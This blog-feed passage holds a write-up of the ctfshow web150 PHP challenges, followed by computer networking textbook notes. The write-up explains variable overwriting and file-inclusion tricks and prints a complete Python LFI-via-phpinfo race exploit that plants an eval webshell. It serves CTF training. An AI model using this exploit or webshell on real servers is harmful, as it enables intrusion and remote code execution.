class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>要另<code>$siVIP</code>为真，可以利用<code>extract($_GET);</code>进行变量覆盖</p>
<p>日志文件包含</p>
<p>原理可以看下我都这篇文章<a href="http://npfs06.top/2020/07/04/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">日志文件包含</a></p>
<p><img src="https://img.npfs06.top/20210307171909.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h2><p><del>虽然修复了非预期，但我还是用非预期做的…</del></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>session文件包含</p>
<p>方法我就不多说了，参考我的另一篇文章<a href="http://npfs06.top/2020/10/10/%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a>照着做就好</p>
<p>预期解</p>
<ol>
<li><p>使用<code>?..CTFSHOW..=xxx</code>可以绕过正则匹配,利用<code>空格 [ . +</code>自动转换为<code>_</code>的特性</p>
</li>
<li><p><code>__autoload()</code><br>这个函数并不属于CTFSHOW这个类的,全局都可以用<br>在定义这个函数后,尝试使用不存在的类的时候会自动加载<br>用法参考 <a href="https://www.php.cn/php-weizijiaocheng-426838.html">https://www.php.cn/php-weizijiaocheng-426838.html</a><br> 当class_exists传入参数为当前未定义类的情况下 就会触发<code>__autoload</code>方法进行自动加载<br>传入<code>?..CTFSHOW..=phpinfo</code>就会执行<code>phpinfo()</code><br>然后可以用LFI via PHPINFO<br>可以参考:<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a></p>
<p>修改一下exp再打</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">attempts_counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>(<span class="params">host, port, phpinfo_path, lfi_path, lfi_param, shell_code=<span class="string">&#x27;&lt;?php eval($_POST[&quot;mb&quot;]);?&gt;&#x27;</span>, shell_path=<span class="string">&#x27;/tmp/g&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据提供参数返回请求内容</span></span><br><span class="line"><span class="string">    :param host:HOST</span></span><br><span class="line"><span class="string">    :param port:端口</span></span><br><span class="line"><span class="string">    :param phpinfo_path: phpinfo文件地址</span></span><br><span class="line"><span class="string">    :param lfi_path: 包含lfi的文件地址</span></span><br><span class="line"><span class="string">    :param lfi_param: lfi载入文件时, 指定文件名的参数</span></span><br><span class="line"><span class="string">    :param shell_code: shell代码</span></span><br><span class="line"><span class="string">    :param shell_path: shell代码保存位置</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">        phpinfo_request: phpinfo 请求内容</span></span><br><span class="line"><span class="string">        lfi_request: lfi 请求内容</span></span><br><span class="line"><span class="string">        tag: 标识内容</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tag = <span class="string">&#x27;Security Test&#x27;</span>   <span class="comment"># 搜索验证标识</span></span><br><span class="line">    payload = \</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;&#123;tag&#125;\r</span></span><br><span class="line"><span class="string">&lt;?php $c=fopen(&#x27;&#123;shell_path&#125;&#x27;,&#x27;w&#x27;);fwrite($c,&#x27;&#123;shell_code&#125;&#x27;);?&gt;\r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(shell_code=shell_code, tag=tag, shell_path=shell_path)</span><br><span class="line"></span><br><span class="line">    request_data = \</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#123;payload&#125;</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> .<span class="built_in">format</span>(payload=payload)</span><br><span class="line"></span><br><span class="line">    phpinfo_request = \</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;POST &#123;phpinfo_path&#125;?%5f%5fCTFSHOW%5f%5f=phpinfo&amp;a=&#123;padding&#125; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;request_data_length&#125;\r</span></span><br><span class="line"><span class="string">Host: &#123;host&#125;:&#123;port&#125;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#123;request_data&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">    padding=<span class="string">&#x27;A&#x27;</span> * <span class="number">4000</span>,</span><br><span class="line">    phpinfo_path=phpinfo_path,</span><br><span class="line">    request_data_length=<span class="built_in">len</span>(request_data),</span><br><span class="line">    host=host,</span><br><span class="line">    port=port,</span><br><span class="line">    request_data=request_data</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    lfi_request = \</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;POST &#123;lfi_path&#125;?&#123;lfi_param&#125; HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: &#123;host&#125;\r</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">ctf=&#123;&#123;&#125;&#125;\r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">    lfi_path=lfi_path,</span><br><span class="line">    lfi_param=lfi_param,</span><br><span class="line">    host=host</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> phpinfo_request, tag, lfi_request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpinfo_lfi</span>(<span class="params">host, port, phpinfo_request, offset, lfi_request, tag</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通过向phpinfo发送大数据包延缓时间, 然后利用lfi执行</span></span><br><span class="line"><span class="string">    :param host:HOST</span></span><br><span class="line"><span class="string">    :param port:端口</span></span><br><span class="line"><span class="string">    :param phpinfo_request: phpinfo页面请求内容</span></span><br><span class="line"><span class="string">    :param offset: tmp_name在phpinfo中的偏移位</span></span><br><span class="line"><span class="string">    :param lfi_request: lfi页面请求内容</span></span><br><span class="line"><span class="string">    :param tag: 标识内容</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">        tmp_file_name: 临时文件名</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    lfi_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    phpinfo_socket.connect((host, port))</span><br><span class="line">    lfi_socket.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 先向phpinfo发送大数据包, 且其中包含php会将payload放入临时文件中</span></span><br><span class="line">    <span class="comment"># print(phpinfo_request)</span></span><br><span class="line">    <span class="comment"># print(lfi_request)</span></span><br><span class="line">    phpinfo_socket.send(phpinfo_request.encode())</span><br><span class="line"></span><br><span class="line">    phpinfo_response_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(phpinfo_response_data) &lt; offset:</span><br><span class="line">        <span class="comment"># 取不到数据则反复执行</span></span><br><span class="line">        phpinfo_response_data += phpinfo_socket.recv(offset).decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmp_name_index = phpinfo_response_data.index(<span class="string">&#x27;[tmp_name] =&amp;gt&#x27;</span>)</span><br><span class="line">        <span class="comment"># 获取包含payload的临时文件名</span></span><br><span class="line">        tmp_file_name = phpinfo_response_data[</span><br><span class="line">                            tmp_name_index + <span class="number">17</span>:</span><br><span class="line">                            tmp_name_index + <span class="number">31</span></span><br><span class="line">                        ]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 2. 再向lfi发送包含payload的临时文件名, 用于包含</span></span><br><span class="line">    lfi_socket.send((lfi_request.<span class="built_in">format</span>(tmp_file_name)).encode())</span><br><span class="line">    <span class="comment"># print(lfi_request.format(tmp_file_name))</span></span><br><span class="line">    lfi_response_data = lfi_socket.recv(<span class="number">4096</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 停止phpinfo socket连接</span></span><br><span class="line">    phpinfo_socket.close()</span><br><span class="line">    <span class="comment"># 4. 停止lfi socket连接</span></span><br><span class="line">    lfi_socket.close()</span><br><span class="line">    <span class="keyword">if</span> lfi_response_data.find(tag) != -<span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 5. lfi response中存在标识内容则payload执行成功</span></span><br><span class="line">        <span class="keyword">return</span> tmp_file_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, event, lock, max_attempts,</span></span></span><br><span class="line"><span class="function"><span class="params">                 host, port, phpinfo_request,</span></span></span><br><span class="line"><span class="function"><span class="params">                 offset, lfi_request, tag,</span></span></span><br><span class="line"><span class="function"><span class="params">                 shell_code, shell_path,</span></span></span><br><span class="line"><span class="function"><span class="params">                 lfi_path, lfi_param</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = event</span><br><span class="line">        self.lock = lock</span><br><span class="line">        self.max_attempts = max_attempts</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.phpinfo_request = phpinfo_request</span><br><span class="line">        self.offset = offset</span><br><span class="line">        self.lfi_request = lfi_request</span><br><span class="line">        self.tag = tag</span><br><span class="line">        self.shell_code = shell_code</span><br><span class="line">        self.shell_path = shell_path</span><br><span class="line">        self.lfi_path = lfi_path</span><br><span class="line">        self.lfi_param = lfi_param</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> attempts_counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="comment"># 如果没有set event则一直重复执行, 直到已尝试次数大于最大尝试数(attempts_counter &gt; max_attempts)</span></span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="comment"># 获取锁, 执行完后释放</span></span><br><span class="line">                <span class="keyword">if</span> attempts_counter &gt;= self.max_attempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                attempts_counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                tmp_file_name = phpinfo_lfi(</span><br><span class="line">                    self.host, self.port, self.phpinfo_request, self.offset, self.lfi_request, self.tag)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> tmp_file_name:</span><br><span class="line">                    <span class="comment"># 找到tmp_file_name后通过set event停止运行</span></span><br><span class="line">                    print(<span class="string">&#x27;\n&#123;shell_code&#125; 已经被写入到&#123;shell_path&#125;中&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                        shell_code=self.shell_code,</span><br><span class="line">                        shell_path=self.shell_path</span><br><span class="line">                    ))</span><br><span class="line">                    <span class="string">&#x27;http://127.0.0.1/test/lfi_phpinfo/lfi.php?load=/tmp/gc&amp;f=uname%20-a&#x27;</span></span><br><span class="line">                    print(<span class="string">&#x27;默认调用方法: http://&#123;host&#125;:&#123;port&#125;&#123;lfi_path&#125;?&#123;lfi_param&#125;=&#123;shell_path&#125;&amp;f=uname%20-a&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                        host=self.host,</span><br><span class="line">                        port=self.port,</span><br><span class="line">                        lfi_path=self.lfi_path,</span><br><span class="line">                        lfi_param=self.lfi_param,</span><br><span class="line">                        shell_path=self.shell_path</span><br><span class="line">                    ))</span><br><span class="line"></span><br><span class="line">                    self.event.<span class="built_in">set</span>()</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_offset</span>(<span class="params">host, port, phpinfo_request</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取tmp_name在phpinfo中的偏移量</span></span><br><span class="line"><span class="string">    :param host: HOST</span></span><br><span class="line"><span class="string">    :param port: 端口</span></span><br><span class="line"><span class="string">    :param phpinfo_request: phpinfo 请求内容</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">        tmp_name在phpinfo中的偏移量</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    phpinfo_socket.connect((host, port))</span><br><span class="line">    phpinfo_socket.send(phpinfo_request.encode())</span><br><span class="line">    phpinfo_response_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = phpinfo_socket.recv(<span class="number">4096</span>).decode()</span><br><span class="line">        phpinfo_response_data += i</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检测是否是最后一个数据块</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&#x27;0\r\n\r\n&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    phpinfo_socket.close()</span><br><span class="line">    tmp_name_index = phpinfo_response_data.find(<span class="string">&#x27;[tmp_name] =&amp;gt&#x27;</span>)</span><br><span class="line">    print(phpinfo_response_data)</span><br><span class="line">    <span class="keyword">if</span> tmp_name_index == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;没有在phpinfo中找到tmp_name&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;找到了 &#123;&#125; 在phpinfo内容索引为&#123;&#125;的位置&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        phpinfo_response_data[tmp_name_index:tmp_name_index+<span class="number">10</span>], tmp_name_index))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tmp_name_index + <span class="number">256</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    pool_size = <span class="number">100</span></span><br><span class="line">    host = <span class="string">&#x27;9627f67a-6cd4-4434-82d0-24853f6204c8.chall.ctf.show&#x27;</span></span><br><span class="line">    port = <span class="number">80</span></span><br><span class="line">    phpinfo_path = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    lfi_path = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    lfi_param = <span class="string">&#x27;isVIP=1&#x27;</span></span><br><span class="line">    shell_code = <span class="string">&#x27;&lt;?php eval($_POST[&quot;mb&quot;]);?&gt;&#x27;</span></span><br><span class="line">    shell_path = <span class="string">&#x27;/tmp/g&#x27;</span></span><br><span class="line">    <span class="comment"># 最大尝试次数</span></span><br><span class="line">    max_attempts = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;LFI With PHPInfo()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 一 生成phpinfo请求内容, 标志内容, lfi请求内容</span></span><br><span class="line">    phpinfo_request, tag, lfi_request = setup(</span><br><span class="line">        host=host, port=port, phpinfo_path=phpinfo_path, lfi_path=lfi_path,</span><br><span class="line">        lfi_param=lfi_param, shell_code=shell_code, shell_path=shell_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 二 获取[tmp_name]在phpinfo中的偏移位</span></span><br><span class="line">    offset = get_offset(host, port, phpinfo_request)</span><br><span class="line"></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    thread_event = threading.Event()</span><br><span class="line">    thread_lock = threading.Lock()</span><br><span class="line">    print(<span class="string">&#x27;创建线程池 &#123;&#125;...&#x27;</span>.<span class="built_in">format</span>(pool_size))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    thread_pool = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, pool_size):</span><br><span class="line">        <span class="comment"># 三 多线程执行phpinfo_lfi</span></span><br><span class="line">        thread_pool.append(ThreadWorker(thread_event, thread_lock, max_attempts,</span><br><span class="line">                                        host, port, phpinfo_request, offset,</span><br><span class="line">                                        lfi_request, tag,</span><br><span class="line">                                        shell_code, shell_path,</span><br><span class="line">                                        lfi_path, lfi_param</span><br><span class="line">                                        ))</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_pool:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> thread_event.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> thread_event.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> thread_lock:</span><br><span class="line">                sys.stdout.write(<span class="string">&#x27;\r&#123;&#125; / &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(attempts_counter, max_attempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> attempts_counter &gt;= max_attempts:</span><br><span class="line">                    <span class="comment"># 尝试次数大于最大尝试次数则退出</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> thread_event.is_set():</span><br><span class="line">            print(<span class="string">&#x27;&#x27;&#x27;success !&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;LJBD!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">&#x27;\n正在停止所有线程...&#x27;</span>)</span><br><span class="line">        thread_event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_pool:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web入门</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络(第七版)</title>
    <url>/2021/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC%E4%B8%83%E7%89%88/</url>
    <content><![CDATA[<p>计算机网络(第七版)<a id="more"></a></p>
<h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h1><p><img src="https://img.npfs06.top/20210315124919.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="计算机网络在信息时代的作用"><a href="#计算机网络在信息时代的作用" class="headerlink" title="计算机网络在信息时代的作用"></a>计算机网络在信息时代的作用</h2><p>互联网基本特点：</p>
<p>​    连通性：互联网上用户不管距离多远，都能通信，就像这些用户终端都彼此连通</p>
<p>​    共享性：指资源共享，包含信息、软件、硬件等共享，就像资源在用户身边</p>
<p>计算机网络(网络)的组成：由若干结点和连接这些结点的链路组成；结点可以是计算机、集线器、交换机、路由器等</p>
<p>互连网：网络之间通过路由器连接，构成更大的网络，就是互连网，是网络的网络</p>
<p>主机(host)：与网络相连的计算机</p>
<h2 id="互联网的组成"><a href="#互联网的组成" class="headerlink" title="互联网的组成"></a>互联网的组成</h2><p>​    从其工作方式上，分成两大部分：</p>
<p>​        边缘部分：由互联网上的主机组成，是用户直接使用的部分，用来进行通信和资源共享</p>
<p>​        核心部分：由大量网络和连接这些网络的路由器组成，是为边缘部分提供服务的，提供连通性和交换</p>
<h3 id="边缘部分："><a href="#边缘部分：" class="headerlink" title="边缘部分："></a>边缘部分：</h3><p> 端系统：主机</p>
<p>计算机之间的通信：主机A上的进程与主机B上的进程进行通信</p>
<p>端系统间通信方式：</p>
<p>​    1.客户-服务器方式：</p>
<p>​        概述：是最常用与传统的方式，一方请求服务，一方提供服务，通信可以是单向的，也可以是双向的</p>
<p>​        客户和服务器：指通信中涉及的两个应用进程</p>
<p>​        主要特征：客户是服务请求方，服务器是服务提供方</p>
<p>​        主要特点：</p>
<p>​            客户程序：</p>
<p>​               (1)用户调用后，在通信时主动向远地服务器发起通信(请求服务)。因此，客户程序必须知道服务器程序的地址</p>
<p>​               (2)不需要特殊的硬件和很复杂的操作系统</p>
<p>​            服务器程序：</p>
<p>​                (1)是一种专门提供服务的程序，可同时处理多个客户的请求</p>
<p>​                (2)系统启动后即自动调用不断运行，被动等待接受客户的通信请求。因此，服务器程序不需要知道客户程序的地址</p>
<p>​                (3)一般需要强大的硬件和操作系统支持</p>
<p>   2.对等连接方式(P2P)：</p>
<p>​        概述：两台主机不区分服务器和客户，只要都运行p2p软件，就可以进行平等对等连接通信，双方都可访问对方硬盘中的共享文档。可支持大量对等用户同时工作</p>
<h3 id="核心部分"><a href="#核心部分" class="headerlink" title="核心部分"></a>核心部分</h3><p>路由器的重要性：路由器是一种专用计算机，是实现分组交换的关键部件，其任务是转发收到的分组，这是网络核心部分最重要的功能</p>
<p>交换：按照某种方式动态分配传输线路的资源</p>
<p>三种交换方式：</p>
<p>​    (1)电路交换：</p>
<p>​        工作方式：在两用户端间建立一条专用的物理通路，保证了双方通信所需的通信资源，而这些资源在双方通信时也不会被其他用户占用</p>
<p>​        三个步骤：建立连接(占用通信资源)-&gt;通话(一直占用通信资源)-&gt;释放连接(归还通信资源)</p>
<p>​        重要特点：在通话的全部时间内，通话的两个用户始终占用端到端的通信资源</p>
<p>​    (2)报文交换：</p>
<p>​        特点：整个报文先传送到相邻结点，全部存储下来后查找转发表，转发给下一个结点</p>
<p>   (3)分组交换：</p>
<p>​        工作方式：采用存储转发技术，把一个报文划分为几个分组后进行传送</p>
<p>​        报文：要发送的整块数据</p>
<p>​        分组：把较长的报文分成更小的等长数据段，再加上必要的控制信息组成的首部后，就构成一个分组；分组又称包，分组的首部又称包头</p>
<p>​        首部的重要性：包含了诸如目的地址和源地址等重要控制信息，使每一个分组才能独立的选择传输路径，并正确交付到终点</p>
<p>​        存储转发技术：路由器收到分组后，先暂时存储，检查其首部，查找转发表，按照首部中目的地址，选择合适的接口转发出去</p>
<p>​        优点：</p>
<p>​            高效：在分组传输过程动态分配传输带宽，对通信链路逐段占用</p>
<p>​            灵活：为每个分组独立选择最合适的转发路由</p>
<p>​            迅速：以分组为单位传输，不用建立和释放连接</p>
<p>​            可靠：保证可靠性的网络协议；分布式多路由器的分组交换网，有很好的生存性</p>
<p>三种交换的特点概述：</p>
<p>​    (1)电路交换：整个报文的比特流连续的从源点直达终点，好像在管道中传送</p>
<p>​    (2)报文交换：整个报文先传送到相邻结点，全部存储下来后查找转发表，转发给下一个结点</p>
<p>​    (3)分组交换：单个分组传送到相邻结点，存储下来后查找转发表，转发给下一个结点</p>
<h2 id="计算机网络的类别"><a href="#计算机网络的类别" class="headerlink" title="计算机网络的类别"></a>计算机网络的类别</h2><p> 按照网络的作用范围分类：</p>
<p>​    广域网(WAN)：作用范围几十到几千公里，是互联网的核心部分，其任务是通过长距离运送主机所发送的数据，广域网各结点采用高速链路，有较大通信容量</p>
<p>​    城域网(MAN)：作用范围一个城市，用来将多个局域网进行互联，多采用以太网技术</p>
<p>​    局域网(LAN)：作用范围1km左右，一般用微机或工作站通过高速通信线路相连</p>
